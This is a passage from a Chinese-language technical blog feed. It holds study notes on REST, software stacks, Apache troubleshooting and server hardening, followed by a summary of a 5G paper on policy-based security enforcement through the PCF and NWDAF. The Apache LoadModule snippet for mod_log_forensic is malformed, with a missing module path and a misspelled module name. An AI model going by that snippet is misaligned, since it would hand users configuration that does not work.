Verb&#x2F;Methods: GET、POST、PUT、DELETE</li></ul></li><li>使用nesting來表示資源的層次結構<ul><li>ex. GET for URI: &#x2F;authors&#x2F;:id&#x2F;address</li><li>別太多層</li></ul></li><li>錯誤處理應透過返回應用程式適當的error code來處理，REST中也定義了適當的HTTP Status Code可根據不同場景來一起發送<ul><li>error code要搭配適當錯誤訊息，幫助開發人員糾正措施，但別太詳細防止駭客知道太多</li><li>400-Bad Request</li><li>401-Unauthorized</li><li>403-Forbidden</li><li>404-Not Found</li><li>500-Internal Server Error</li><li>502-Bad Gateway</li><li>503-Service Unavailable</li></ul></li></ul></li><li>你了解哪些分散式系統架構?<ul><li>我知道用來maintain以及運行分散是系統的技術，就Kubernetes</li></ul></li><li><a href="https://searchapparchitecture.techtarget.com/definition/software-stack">那甚麼是Software Stack?</a><br>  <img src="https://i.imgur.com/NOpfrAK.png"><ul><li>是一堆獨立組件的集合，他們協同工作來完成應用程式的執行</li><li>這些組件可能包含:OS、協定、runtime環境、Library、DB和Function Call</li><li>根據所需運行的應用程式，至少會是OS、DB、支援編寫程式的工具和應用程式</li></ul></li><li>那甚麼是Solution Stack?<ul><li>要開發一款網路應用程式，會需要定義目標OS、網頁server、DB以及語言</li><li>或要定義OS、Middleware、DB及應用程式，有時也會將硬體涵蓋在內</li><li>舉例:<ul><li>BCHS<ul><li>OpenBSD</li><li>C</li><li>httpd</li><li>SQLite</li></ul></li><li>ELK<ul><li>Elasticsearch</li><li>Logstash</li><li>Kibana</li></ul></li><li>Ganeti<ul><li>Xen或KVM</li><li>搭配LVM的Linux</li><li>DRBD</li><li>Ganeti</li><li>Ganeti Web Manager</li></ul></li><li>LAMP<ul><li>Linux</li><li>Apache</li><li>MySQL&#x2F;MariaDB</li><li>Perl、PHP、Python</li></ul></li><li>LAPP<ul><li>Linux</li><li>Apache</li><li>PostgreSQL</li><li>Perl、PHP、Python</li></ul></li><li>LLMP<ul><li>Linux</li><li>Lighttpd</li><li>MySQL&#x2F;MariaDB</li><li>Perl、PHP、Python</li></ul></li><li>MEAN<ul><li>MongoDB</li><li>Express.js</li><li>Angular.js</li><li>Node.js</li></ul></li><li>MERN<ul><li>MongoDB</li><li>Express.js</li><li>React.js</li><li>Node.js</li></ul></li><li>MEVN<ul><li>MongoDB</li><li>Express.js</li><li>Vue.js</li><li>Node.js</li></ul></li></ul></li></ul></li></ul><h2 id="Apache-Troubleshooting"><a href="#Apache-Troubleshooting" class="headerlink" title="Apache Troubleshooting"></a><a href="https://www.acunetix.com/websitesecurity/troubleshooting-tips-for-apache/">Apache Troubleshooting</a></h2><h3 id="httpd-conf-設定錯誤"><a href="#httpd-conf-設定錯誤" class="headerlink" title="httpd.conf 設定錯誤"></a>httpd.conf 設定錯誤</h3><ul><li>Syntax Error<ul><li>Linux上需使用 <code>apachectl -configtest</code>來檢測Syntax Error</li><li>Windows系統上的Apache須先到Apache的bin目錄上，然後執行 <code>httpd.exe -t</code></li><li>修正問題後重啟Apache並重新透過上述指令做檢查</li></ul></li></ul><h3 id="Vulenrabilities"><a href="#Vulenrabilities" class="headerlink" title="Vulenrabilities"></a>Vulenrabilities</h3><ul><li>使用最新版本的Apache</li><li>使用弱掃工具去檢查</li><li>隨時查看最新的CVE，並上Patch</li></ul><h3 id="Apache-HTTP-Server-Logs"><a href="#Apache-HTTP-Server-Logs" class="headerlink" title="Apache HTTP Server Logs"></a>Apache HTTP Server Logs</h3><p>應分析Apache HTTP Server中的<strong>error logs</strong>，<strong>它提供了有關 Web 服務器上發生的任何錯誤的詳細資訊</strong> 路徑: <code> /var/log/apache2/error.log</code>、<code>/etc/apache2/apache2.conf</code>、<code>/etc/httpd/conf/httpd.conf</code></p><p>預設會放在Apache安裝目錄中的log目錄中的<strong>error_log</strong>檔案中<br>也可從httpd.conf中去設定要紀錄哪一類型的錯誤，httpd.conf中有8個log級別的資訊<br>除了error log以外還提供access log來紀錄Server處理過的所有請求。<br>這些日誌還可以對可能導致問題的原因提供額外的解釋，還可以補充錯誤日誌中的資訊。</p><h3 id="使用Mod-log-forensic-模組"><a href="#使用Mod-log-forensic-模組" class="headerlink" title="使用Mod_log_forensic 模組"></a>使用Mod_log_forensic 模組</h3><p><code>mod_log_forensic</code>模組用於提供client端請求的<strong>forensic log</strong><br>這包含了處理前與處理後的請求，並使用相同ID來引用相同的請求，因此可以輕鬆識別由特定請求引發的任何問題<br><strong>可以用來分析哪些請求會導致Web Server崩潰</strong><br>若要啟用這個模組，需要在 <code>Apache httpd.conf</code>文件中設定:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LoadModule log_forensic_module_forensic.so</span><br><span class="line">LoadModule uniques_id_module modules/mod_unique_id.so</span><br><span class="line">ForensicLog logs/forensic_log</span><br></pre></td></tr></table></figure><p>也可將 <strong>check_forensic</strong>的bash腳本與 mod_log_forensic模組結合使用，以列出在forensic log中發現任何不完整的請求<br><code>check_forensic &lt;log_file&gt;</code></p><h3 id="使用-mod-whatkilledus-module"><a href="#使用-mod-whatkilledus-module" class="headerlink" title="使用 mod_whatkilledus module"></a>使用 mod_whatkilledus module</h3><p>當事情非常糟糕且Apache Server崩潰時，<code>mod_whatkilledus</code>模組可用於紀錄有關崩潰的詳細技術資訊以及導致發生crash的原始client端請求。</p><p>此外若啟用了 <code>mod_backtrace</code>模組，這將包含顯示故障點的回溯，這對於在滿足某些條件後使用回溯註釋錯誤日誌很有用</p><p>對於Unix系統，只有在 httpd建構中啟用了 <code>--enable-exception-hook</code> 參數時，這些模組才會起作用。而對於Windows系統則沒有特殊要求</p><ul><li><code>mode_whatkilledus</code> 以及 <code>mod_backtrace</code> 的說明文件: <a href="https://emptyhammock.com/projects/httpd/diag/quick-start.html">https://emptyhammock.com/projects/httpd/diag/quick-start.html</a></li></ul><h3 id="使用第三方模組"><a href="#使用第三方模組" class="headerlink" title="使用第三方模組"></a>使用第三方模組</h3><p>使用第三方模組可能會導致在安裝Apache HTTP Server時遇到問題<br>因此應該禁用第三方模組，並檢查問題是否可以重現，若禁用模組可以解決問題則一個一個重起每個模組，以便確定是哪個模組帶來的原因</p><h3 id="將Apache-HTTP-Server做為單一process並使用Debug工具"><a href="#將Apache-HTTP-Server做為單一process並使用Debug工具" class="headerlink" title="將Apache HTTP Server做為單一process並使用Debug工具"></a>將Apache HTTP Server做為單一process並使用Debug工具</h3><p>典型的Apache HTTP Server安裝會運行多個process<br>但如果要troubleshooting最好是以單一process運行<br>可在啟動apache時候使用X選項<br><code>$ httpd -X</code> 這可使Apache以單一process模式來啟動，這代表Apache不會去fork出新的chidren或與終端detach<br>這樣所有流量與通訊都將通過一個單一的process，就能在debugger(ex. gdb)底下運行apache httpd並取得崩潰的bracktace並強制server去行coredump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb httpd</span><br></pre></td></tr></table></figure><p>接著就是透過gdb先去設breakpoint，然後去做單步追蹤，一行一行看可能錯在哪?</p><h3 id="腳本執行問題"><a href="#腳本執行問題" class="headerlink" title="腳本執行問題"></a>腳本執行問題</h3><p>動態內容通常由 Apache HTTP Server通過 <code>mod_cgi</code>模組執行的腳本提供<br>這個模組包含自己的logging機制用來記錄在腳本執行期間發生的任何錯誤</p><p>啟用<strong>ScriptLog</strong>指令後，mod_cgi將記錄任何未按照預期執行的腳本的輸出，包含<br>Server Response Code，收到的請求以及任何向客戶端發出的任何回應</p><p>要啟用此功能需要修改 httpd.conf文件，並指定ScriptLog指令和保存log的位置<br><code>ScriptLog logs/cgi_log</code></p><h2 id="IIS-Troubleshooting"><a href="#IIS-Troubleshooting" class="headerlink" title="IIS Troubleshooting"></a><a href="https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524996(v=vs.90)">IIS Troubleshooting</a></h2><h2 id="Server端安全"><a href="#Server端安全" class="headerlink" title="Server端安全"></a>Server端安全</h2><ul><li>Server端有甚麼安全建議?<ul><li>移除不必要服務<ul><li>默認安裝有時候會安裝許多不必要的功能ex. 遠端註冊、printer server…etc</li><li>服務越多，開放的port就越多，因此會暴露更多風險</li><li>關閉server中的非必要服務</li></ul></li><li>確保遠端存取的保護措施<ul><li>若web admin需要遠端登入Web server，則需要使用隧道和加密協定來確保遠程連線獲得適當防護 </li><li>在設備或軟體上使用安全token </li><li>遠端存取應限制特定數量IP以及帳戶</li></ul></li><li>分離開發&#x2F;測試&#x2F;生產環境<ul><li>由於開發人員在生產服務器上開發更新版本的 Web 應用程序更容易、更快捷，因此 Web 應用程序的開發和測試直接在生產服務器本身上完成是很常見的。</li><li>有可能會在網路上蒐到特定網站的更新版本，或在&#x2F;test&#x2F;、&#x2F;new&#x2F;或其他類似子目錄底下發現不應該給公眾知道的內容 </li><li>所以如果在同台Server上同時開發、測試跟生產，如果權限沒設好而且早期開發階段安全性容易沒做好，容易被打穿網站</li></ul></li><li>Web應用內容以及Server Script安全<ul><li>web應用或網站文件應該要位於OS系統文件、log文件以外的獨立分區或driver上</li><li>因為如果攻擊者獲得web目錄存取權限，可能就可以透過其他漏洞去做提權並存取整個磁碟上的資料</li></ul></li><li>確保適當權限與特權<ul><li>始終分配運行特定網路服務所需的最權限</li></ul></li><li>按時安裝所有patch</li><li>監控或audit server <ul><li>應經常監控和檢查所有網路服務log、網站access log、DB Server log(ex. Microsoft SQL Server、MySQL、Oracle)和OS Log</li><li>若log中發現奇怪活動，應該立刻去解決它</li></ul></li><li>用戶帳戶管理<ul><li>禁用未使用的默認帳戶<ul><li><code>userdel</code> 指令</li></ul></li><li>每個帳戶要設定它應有的正確權限</li></ul></li><li>刪除未使用的模組和應用程式<ul><li>Apache預設會安裝多預定義的模組 </li><li>典型Web Server不會使用這些模組，因此需要關閉，防止針對此類模組的攻擊</li></ul></li><li>使用Network Sever軟體所提供的安全工具<ul><li>Mircosoft 發布許多工具來幫助admin來保護IIS Web Server安裝</li><li>Apache也有提供 <strong>mod_security</strong>模組</li></ul></li><li>使用外部scanner<ul><li>nessus</li><li>nikto</li><li>或其他弱掃工具</li></ul></li></ul></li></ul><h2 id="Log檔案"><a href="#Log檔案" class="headerlink" title="Log檔案"></a>Log檔案</h2><p>系統錯誤資訊 - <code>/var/logs/syslog</code> 或 <code>/var/logs/messages</code><br>與登入帳密有關的log - <code>/var/logs/secure</code> 或 <code>/var/logs/auth.loh</code>(Debian)<br>紀錄哪個服務的log會被放在哪? - <code>/etc/rsyslog.conf</code>，會被放在<code>/etc/rsyslog.d</code> 底下</p><h3 id="Syslog等級"><a href="#Syslog等級" class="headerlink" title="Syslog等級"></a>Syslog等級</h3><p><img src="https://i.imgur.com/GxaNR3I.png"></p><h3 id="Systemcall"><a href="#Systemcall" class="headerlink" title="Systemcall"></a>Systemcall</h3><h2 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h2><ul><li>如果程式中使用malloc但沒有free掉會怎樣?<ul><li>heap memory會一直被占著，直到程式結束，不會自動釋放</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
          <category> Troubleshooting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> Linux </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Security policies definition and enforcement utilizing policy control function framework in 5G</title>
      <link href="/posts/de3933f9.html"/>
      <url>/posts/de3933f9.html</url>
      
        <content type="html"><![CDATA[<style>    :root{    --maincolor: #50fa7b;    }   .info{    padding: 15px;    margin-bottom: 20px;    color: #ffffff;    border: 1px solid transparent;    border-radius: 10px;    background-color: #343232;    border-color: #b8bdb4;   }   .special{        border-bottom: 3px solid var(--maincolor);        color: inherit;        text-decoration:none;   }   .newbold{        color: #ffffff;        font-weight: bold;        text-decoration:none;   }   a{    color: #337ab7;    text-decoration: none;   }</style><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>本篇討論的是3GPP定義的5G System(5GS)範圍之中的網路安全議題</p><h3 id="5G標準制定"><a href="#5G標準制定" class="headerlink" title="5G標準制定"></a>5G標準制定</h3><p>許多組織或會議對於開發5G架構有卓越貢獻，尤其是在安全層面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- ITU</span><br><span class="line">- ETSI</span><br><span class="line">- IETF</span><br><span class="line">- NGMN</span><br><span class="line">- 5G-PPP</span><br><span class="line">- NIST</span><br><span class="line">- GSMA等等</span><br></pre></td></tr></table></figure><p>有些負責在特定infra上像是關鍵基礎設施，其餘則是為特定用例開發安全標準</p><blockquote><p>S3A Working Group → 定義5G網路 end to end 安全層面</p></blockquote><h3 id="5GS"><a href="#5GS" class="headerlink" title="5GS"></a>5GS</h3><p>5G System &#x3D; Access Network + Core Network + UE<br>System Arcitecture → Service-Based Architecture → Is composed of multiple NFs<br>SBA架構中，不同的NFs之間的互動可以兩個NF的點對點的參考點來表示<br><strong>SBI(Service-based Interface)</strong> 用來表示一個給定的NF要如何提供或開放一組服務</p><p><strong>Policy Control Function(PCF)</strong> 是一個網路功能用以提供統一且一致的框架來定義任何類型的策略，在前幾代行動網路中，PCF僅用於QoS或計費方面的策略制定</p><p>5G架構中增加了對於網路資料分析的服務，藉由一個新的NF，NWDAF(Network Data Analytics Services)<br>用於</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 負載級別(Load Level)資訊</span><br><span class="line">2. 服務體驗</span><br><span class="line">3. 網路效能</span><br><span class="line">4. 異常行為</span><br></pre></td></tr></table></figure><p><span class="special">PCF可以訂閱與此類資訊相關的網路分析通知，並用於計算或更新策略，但這目前尚未標準化</span><br>新的統一策略控制框架與5G系統以及增強的資料分析實體之間並無建立明顯的連結，而本篇論文的結果可以幫助這三項區域變得更加緊密</p><p>主要目標是要找到一個有效的security enforcement schema用以彈性地建立新的安全策略，並動態地回應持續變化地安全環境，橫跨5G end to end 架構。</p><p>對於橫跨5G系統地Security Enforcement應在<strong>TSG-SA</strong> 層級被討論</p><p>5GS架構中對於User Plane Security Enforcement，會是基於UE與基站之間的air interface其中地機密性與完整性演算法是否啟用</p><p>對於UP的完整性保護演算法是可以選擇性啟用的(例如各切片可以是否啟用)</p><h3 id="網路切片"><a href="#網路切片" class="headerlink" title="網路切片"></a>網路切片</h3><p><span class="special">個別網路切片提供不同種服務可能會有著不同的安全需求，並採用不同安全協定與方法；因此對於不同的網路切片提供不同層級的安全防護會是關鍵</span></p><p>對於安全加密演算法的使用也是選擇性的(e.g. 128bits vs 256 bits key length)<br>像是對於關鍵基礎設施的安全需求以及enhanced Mobile Broadband 大量使用場景的安全需求也有所不同</p><p>將 QoS 原則應用於安全，目標應是利用統一的策略控制框架，並利用新的資料分析功能作為對於網路以及UE知識基礎，在 5G end to end 架構中實現有效的安全策略定義和執行</p><p>現行對於電信網路的保護策略不外乎防火牆、IDS、DDOS保護系統等等，並被廠商的特定管理工具所管理<br>而這些安全功能是為了保護整個網路或根據他們在網路中的定位，而未考慮個別UE</p><ol><li>偵測到單一UE發生安全問題的能力</li><li>應用解決措施到單一UE的方式到目前都是個問題</li></ol><p>本篇研究補足了這些機制，並從end to end網絡的角度豐富了安全性，並提共適當的粒度(granularity) 來考慮個別UE的安全策略<br>→對於 uRLLC 以及 mMTC 部屬場景有幫助</p><p><img src="https://i.imgur.com/BOTV0hU.png"></p><h2 id="2-Challenges-to-apply-end-to-end-security-enforcement-in-5G"><a href="#2-Challenges-to-apply-end-to-end-security-enforcement-in-5G" class="headerlink" title="2. Challenges to apply end to end security enforcement in 5G"></a>2. Challenges to apply end to end security enforcement in 5G</h2><p>為了實踐end to end security enforcement，有四大挑戰要解決</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 為Security Enforcement應用QoS原則</span><br><span class="line">- 會話管理和用戶平面</span><br><span class="line">- 策略控制</span><br><span class="line">- 網路分析</span><br></pre></td></tr></table></figure><h3 id="2-1-Challenges-to-apply-QoS-principles-to-security-enforcement"><a href="#2-1-Challenges-to-apply-QoS-principles-to-security-enforcement" class="headerlink" title="2.1 Challenges to apply QoS principles to security enforcement"></a>2.1 Challenges to apply QoS principles to security enforcement</h3><p>當根據業務需求（例如在垂直市場中產生）將 QoS 實施基本原則應用於安全實施時，主要困難之一是能夠以與 QoS 在網絡中量化的類似方式來衡量安全特性</p><p>QoS 配置文件被很好地定義為應用於 QoS 流的一組 QoS 參數（QoS 流是分組數據單元 (PDU) 會話中 QoS 區分的最細粒度）。這種參數化是定量的，即可以用數字來衡量。例如，5G QoS 標識符是一個由標量表示的參數，用作 5G QoS 特性（如調度、權重、准入閾值等）的參考。甚至還有預先配置的標準化值。但是，如何在 5G 架構中構建安全配置文件，如何建立完整性保護、機密性保護、訪問控製或惡意軟件檢測等方面的量化安全參數化？我們解決這個問題的提議在第 3.1 節中提出。</p><h3 id="2-2-Challenges-at-session-management-level-to-enforce-security-controls"><a href="#2-2-Challenges-at-session-management-level-to-enforce-security-controls" class="headerlink" title="2.2  Challenges at session management level to enforce security controls"></a>2.2  Challenges at session management level to enforce security controls</h3><p>SMF負責接收由UE所發送來的建立PDU Session的請求<br>然而現今的PDU 請求並沒有包含任何安全參數</p><p>所以UE請求<strong>特定的</strong> 5G UP安全服務，即”安全的PDU”，是不可能的<br>然後像是政府關鍵基礎設施可能就有需求是，應提供特殊安全措施在UE與Data Networl之間的PDU Session<br>例如某些<strong>資料無線電承載(Data Radio Bearer)</strong> 支援某些服務中的強加密演算法或更長的加密金鑰</p><p>SMF在建立PDU會話時，根據來自</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- UDM的Subscriber資訊</span><br><span class="line">- 每個DNN/SMF中切片的本地配置UP安全策略</span><br><span class="line">- 每個UE所支援的最高Data Rate</span><br></pre></td></tr></table></figure><p>用以在PDU Session建立UP Security Enforcement 來在每個DRB中提供完整性保護<br>SMF的本地配置被認為是全局適用(global applicable)的靜態策略</p><p>問題是這種靜態方法對於之後的的用例是否仍然有效，其中訂閱計劃可能與安全增值服務和相應的租戶（例如關鍵基礎設施的所有者）需要不同級別的安全（例如每個切片）和對安全事件作出反應的能力</p><p>這些use case需要彈性、可擴展和動態的策略管理以及設定<br>此外，security enforcement只是指示是否要在NG-RAN網路區域應用UP完整性與機密性保護，並僅適用於3GPP類型的存取</p><p>UP Security Enforcement 從NG-RAN擴展到傳輸以及核網會是個挑戰<br>(即PDU會話提供的整體連接的end to end security enforcement方法 會是個挑戰)</p><p><img src="https://i.imgur.com/7xtxVnm.png"><br>圖2顯示了當前UP security enforcement以及注意事項</p><p><img src="https://i.imgur.com/JwXF00a.png"></p><p>一旦PDU Session建立，<br>當前Session的特徵(即PDU會話資訊)僅限於一些主要與QoS相關的資訊元素(例如:QoS Flow ID,Reflective QoS Indicator)<br>當發生了PDU層級的安全事件，並沒有觸發緩解措施的安全屬性<br>例如，當應用程式處理被歸類為機密的資料時在UE與Data Network之間的PDU Session內會需要特別的安全措施，像是DRB所支援服務中所使用的強加密演算法或更長的加密金鑰</p><blockquote><p>在 3.25章節開發了一個框架，為PDU層級的安全事件提供安全屬性</p></blockquote><h3 id="2-3-Challenges-to-fine-security-policies-under-policy-control-framework"><a href="#2-3-Challenges-to-fine-security-policies-under-policy-control-framework" class="headerlink" title="2.3 Challenges to fine security policies under policy control framework"></a>2.3 Challenges to fine security policies under policy control framework</h3><p>雖然為每個訂閱定義安全策略很費力，但這與為QoS進行此操作似乎沒甚麼不同<br>可以預期，安全策略與QoS測並非真正獨立，而是相同策略可被應用在大量訂閱 e.g.per slice</p><p><strong>Policy and Charging Control rule (PCC rule)</strong> 包含啟用用戶面偵測、策略控制、對於服務資料流的適當計費所需的資訊</p><p>兩種PCC rules存在:動態與預定義規則<br>動態規則由PCF提供給SMF，而預定義PCC規則則是被設定至SMF</p><p>當動態規則與預先定義的PCC規則有相同優先級，則動態規則優先<br>這些policies的目標是:</p><ul><li>PDU sessions</li><li>Service Data Flows (SDF). Set of PDUs (within PDU session) identidied by traffic filters</li></ul><p>PCF Control是否應用於PDU Session是由SMF策略基於DNN或每個切片去定義的<br>若沒有PCF Cnotrol，則本地基於策略的rule會在SMF被設定</p><p>PCC rule 定義包含:</p><ul><li>Sevice data flow detection mechanism  (ex. filters, application template)</li><li>Charging releated Information Elements(IEs) </li><li>Policy control related IEs  (ex. Gating, QoS, bit rates…etc)</li></ul><p>service data flow filter 包含用於匹配IP PDU流量以及Ethernet PDU流量的用戶平面資料<br>SMF應用啟用的PCC規則內的Service data flow template information來指示UPF去識別屬於特定<br>service flow的封包</p><p><span class="special">作為一個PCC規則一部分的安全資訊元素的適當定義會是一個關鍵挑戰</span></p><p>目前 <strong>3GPP TS 23.503: Technical Specification Policy and Charging Control Frameworkfor the 5G System</strong> 所定義的PCC Rules不明確包含此類參數，也不作為能夠識別安全事件的服務資料流偵測的一部分，或者做為策略控制操作的一部分。 此外，SMF發送有關PDU Session狀態(e.g. 存取類型、漫遊、IP位址等等)的PCF資訊，因此PCF可以基於特定觸發器做出動態反應從而相應變更策略，所以安全觸發器的定義非常重要，因為它不僅會影響網絡的安全狀態，還會影響網絡的整體 QoS 和 SLA（例如 DDoS 攻擊），然而去創造這些安全觸發器(例如，最近發現的安全漏洞、詐欺、攻擊、違規存取等等)會是挑戰，在UPF或其他特定安全探測器(security probe)中設定一部分偵測過濾器(detection filter)，其策略目標是將安全保證(security assurance)層面包含進網路整體的服務保證中。</p><p><span class="special">⚠️目前問題則是，如何使安全性成為 PCF 的 PCC 決策過程的一部分？</span><br>本篇論文在3.3章節提供解答</p><h3 id="2-4-Challenges-to-introduce-security-use-cases-under-network-analytics"><a href="#2-4-Challenges-to-introduce-security-use-cases-under-network-analytics" class="headerlink" title="2.4 Challenges to introduce security use cases under network analytics"></a>2.4 Challenges to introduce security use cases under network analytics</h3><p><strong>Network Data Analytics function (NWADF)</strong> 作為SBA架構出現在Release 15</p><p>可以有多個專門用於不同類型分析的 NWDAF，由分析 ID 訊息元素 (IE) 標識。此 IE 用於識別 NWDAF 可以生成的受支持分析的類型。 NWDAF 出於不同目的與不同實體進行交互，例如基於訂閱不同網絡功能提供的事件的數據收集、從數據存儲庫和 NF 檢索訊息，以及向不同類型的消費者按需提供分析，目前NWADF的資料蒐集功能僅允許從控制平面來源為切片或UE獲取資料，但目前如何從UPF蒐集有關用戶平面安全資料尚未標準化，這實際上目前僅限於流量和數據速率。</p><p><strong>OAM(Operation,Administration and Management)</strong> 系統僅測量與追蹤資料，這些資料可通過Management Service 共享給NWADF</p><p>出於安全分析目的，從用戶平面流量分析中收集的有關惡意軟體、殭屍網絡、協定異常等的資訊，例如通過 [18] 提出的安全探測器（例如嵌入 UPF 中的 IDS）或惡意軟件沙箱，將非常有用通過新的安全用例增強網絡分析。</p><p>這些分析資訊環繞網路切片的負載水平、服務體驗、網路效能、移動性、QoS、UE行為等等<br>提供了有價值的知識基礎</p><p>本文範圍中有三個基本問題被提出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 如何從所分析知識的基礎上取得安全性相關的資訊?</span><br><span class="line">- 在NWADF中可監控和進一步分析哪些特定的新安全參數?</span><br><span class="line">- 在end to end 5G架構中PCF，要如何利用這些資訊來設定並執行安全策略?</span><br></pre></td></tr></table></figure><h2 id="3-Proposed-approach-to-security-enforcement-in-5G"><a href="#3-Proposed-approach-to-security-enforcement-in-5G" class="headerlink" title="3. Proposed approach to security enforcement in 5G"></a>3. Proposed approach to security enforcement in 5G</h2><p>從實施角度來看，到目前為止，行動網絡中安全策略和 QoS 參數的實現在網絡中存在很大差異</p><p>5G PCF是一個單一框架用來定義任何類型的策略並將其遞交給其他控制平面上的NF</p><p>從不久的將來角度來看，當租戶要求的訂閱計畫(Subscription Plan)將需要包含安全條款時，即安全性作為SLA的重要組成部分，就像當今的QoS一樣，我們提出了新的security enforcement方式利用了統一策略控制模型</p><h3 id="3-1-Application-of-QoS-policies-to-security-use-cases"><a href="#3-1-Application-of-QoS-policies-to-security-use-cases" class="headerlink" title="3.1 Application of QoS policies to security use cases"></a>3.1 Application of QoS policies to security use cases</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- session-AMBR</span><br><span class="line">- UE-AMBR</span><br></pre></td></tr></table></figure><p>我們的提案是，這些 QoS 策略可以在接收安全事件或事件時從 PCF 受限制地和動態地應用到網絡中，這些安全事件可以在 NWDAF 或用戶平面的其他安全分析平台（例如，放置在管理平面中的 SIEM 工具，嵌入在 UPF 中的 IDS 系統等）中建立</p><p>基於預定義的安全指標，可以從 PCF 執行不同的策略，實際上作為網絡中的有效緩解機制：</p><ul><li>設定新的session AMBR</li><li>設定新的UE AMBR，這將會是一種對於UE的隔離 (例如，UE是作為DDoS攻擊的active bot)</li><li>在QoS Profile內使用更嚴格的安全控制以設定新的PDU Session</li></ul><p>QoS profiles 可在5G AN中由SMF動態建立；可以透過來自SMF的N1介面上的會話管理信令或直接在N4介面上的UPF上對UE實施特定的QoS規則</p><p>N1介面: UE $\leftrightarrow$ AMF<br>N4介面: SMF $\leftrightarrow$ UPF 用以在用戶平面中管理資料會話<br>N4基於PFCP協定(Packet Forwarding Control Protocol)</p><p>SMF 確實通過規則管理 QoS 流，將流量過濾器與來自 PCF 的 QoS 策略相關聯。<br>流量過濾器集在 UPF 中配置，可用於輕鬆管理安全服務。例如：</p><ul><li>由具有特殊安全要求（例如加密演算法、密鑰長度等）的特定一組UE或切片的特定安全參數index標識出的安全關聯</li><li>像是交通控制之類的偵測與動態QoS 規則可以被動態應用</li></ul><p>下面流程圖描繪了應用安全規則作為在網路中QoS策略的一部分概念:<br><img src="https://i.imgur.com/3514RyB.png"></p><p>下圖為透過以上概念實現的安全呼叫步驟<br><img src="https://i.imgur.com/1t07hXz.png"></p><p><em>1.a</em> <span class="special"><strong>NWDAF → PCF</strong></span><br>PCF訂閱了NWDAF通知<br>由於網路安全事件(ex. DDoS)，我們發現了使用者資料擁塞的情況，該情況透過N23介面傳送給了PCF</p><p><em>1.b</em> <span class="special"><strong>Security Management → PCF</strong></span><br>安全管理系統通過REST API與PCF整合而成<br>安全事件被報告給PCF</p><p><em>1.c</em> <span class="special"><strong>PCF → UDR(optional)</strong></span><br>PCF藉由N36介面向UDR請求一組資料<br>在此用例中，請求資料可以是訂閱策略集的安全策略部分的ID，以在發生安全事件時應用。</p><p><em>2.</em> <span class="special"><strong>PCF → SMF</strong></span><br>當PCF做出策略決定後，PCF則確定SMF需要更新策略資訊以緩解安全問題，並藉由N7介面發送一個<br><strong>Npcf_SMPolicyControl_UpdateNotify</strong> 請求其中包含關於PDU Session的更新策略資訊，在這種情況下建立新的 Session AMBR</p><p><em>3.</em> <span class="special"><strong>SMF → PCF</strong></span><br>SMF回應PCF一個ACK</p><p><em>4.a</em> <span class="special"><strong>SMF → UPF</strong></span><br>基於SMF所發送的QoS Emforcement Rule的QoS enforcement是一個由UPF提供的功能<br>包含通過N4介面對Session AMBR (Step2 從SMF接收來自PCF)</p><p><em>4.b</em> <span class="special"><strong>SMF → UE</strong></span><br>藉由AMF與UE交換N1 SM信令，來提供UE QoS規則<br>e.g. 設定新的UE-AMBR 來限制在UE所有PDU Session中所有Non-GBR QoS Flow所被預期可提供的最高Bit rate</p><p><em>4.c</em>  <span class="special"><strong>SMF → 5G AN</strong></span><br>藉由AMF與5G-RAN交換N2 SM信令，以設定5G RAN的QoS參數<br>e.g. 為特定類型的流量預留資源</p><h3 id="3-2-User-plane-security-enforcement-and-assurance"><a href="#3-2-User-plane-security-enforcement-and-assurance" class="headerlink" title="3.2. User plane security enforcement and assurance"></a>3.2. User plane security enforcement and assurance</h3><p>在UP 流量上實現安全策略的方式是一樣是基於策略控制</p><p>直接作用於AMF、SMF等控制NF，而PCF應到達UE、RAN和UPF以直接在UP上應用這些策略</p><h4 id="3-2-1-Security-policies-enforcement-via-AMF"><a href="#3-2-1-Security-policies-enforcement-via-AMF" class="headerlink" title="3.2.1. Security policies enforcement via AMF"></a>3.2.1. Security policies enforcement via AMF</h4><p><img src="https://i.imgur.com/MfoI2Au.png"></p><p>有兩種類別的策略是為了<strong>存取</strong>與<strong>移動性管理</strong><br>它們被AMF執行、由PCF規定並儲存在UDR中<br>它們可以支持安全用例，而無需對策略定義進行重大更改：</p><ul><li><p>Policies transfered from PCF to AMF:</p><ul><li>Service area restrications<br>  <strong>Tracking Area</strong> 是一種區域上的邏輯概念，使用者可在其中移動而無須更新管理節點，網路會分配一個或多個TAs到使用者上<br>  而Service area restrication包含<strong>允許區域</strong>與<strong>非允許區域</strong><br>  本篇論文提出，使用特定閥值為不同服務區域建立安全等級，來決定使用者是否有權移動到高安全服務區域<br>  舉例: 地理上的敏感地區，像是關鍵基礎設施可能會限制對使用 <strong>“Null Schema”</strong> 